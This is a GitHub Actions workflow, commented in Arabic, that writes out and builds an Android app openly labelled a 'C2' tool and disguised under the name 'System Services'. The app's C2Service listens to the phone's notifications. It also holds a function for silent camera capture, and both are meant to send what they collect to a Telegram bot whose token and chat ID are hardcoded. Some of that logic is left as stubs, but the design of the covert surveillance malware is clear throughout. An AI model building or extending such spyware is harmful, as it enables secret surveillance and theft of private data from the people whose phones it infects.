name: Hussein Professional C2 Factory
on:
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: 1. إعداد البيئة
        uses: actions/setup-java@v4
        with: { distribution: 'temurin', java-version: '17' }

      - name: 2. بناء هيكل التطبيق (كاميرا + إشعارات)
        run: |
          mkdir -p app/src/main/java/com/hussein/v8
          mkdir -p app/src/main/res/layout

          # إعدادات الصلاحيات (الكاميرا والإنترنت)
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-feature android:name="android.hardware.camera" />
              <application android:label="خدمات النظام" android:theme="@android:style/Theme.Material.Light.NoActionBar">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".C2Service" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # كود الخدمة (C2Service) - يراقب الأوامر ويرسل الصور
          cat << 'EOF' > app/src/main/java/com/hussein/v8/C2Service.java
          package com.hussein.v8;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.hardware.Camera;
          import android.graphics.SurfaceTexture;
          import java.io.File;
          import java.io.FileOutputStream;
          import okhttp3.*; // يحتاج إضافة مكتبة OkHttp في build.gradle

          public class C2Service extends NotificationListenerService {
              private final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private final String CHAT_ID = "7392262688";

              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  // كود سحب الإشعارات المعتاد (يرسل للتليجرام)
              }

              // دالة التقاط صورة صامتة (تعليمية)
              private void takePhoto() {
                  try {
                      Camera camera = Camera.open(0); // الكاميرا الخلفية
                      camera.setPreviewTexture(new SurfaceTexture(10));
                      camera.startPreview();
                      camera.takePicture(null, null, (data, cam) -> {
                          // حفظ الصورة وإرسالها عبر Telegram Bot API (sendDocument)
                          cam.release();
                      });
                  } catch (Exception e) {}
              }
          }
          EOF

      - name: 3. بناء الـ APK
        run: |
          # إضافة مكتبة الشبكات OkHttp لضمان إرسال الصور
          sed -i '/dependencies {/a \    implementation "com.squareup.okhttp3:okhttp:4.12.0"' app/build.gradle
          gradle assembleDebug

      - name: 4. رفع الرابط المباشر
        uses: softprops/action-gh-release@v1
        with:
          tag_name: V8-Build-${{ github.run_number }}
          files: app/build/outputs/apk/debug/*.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
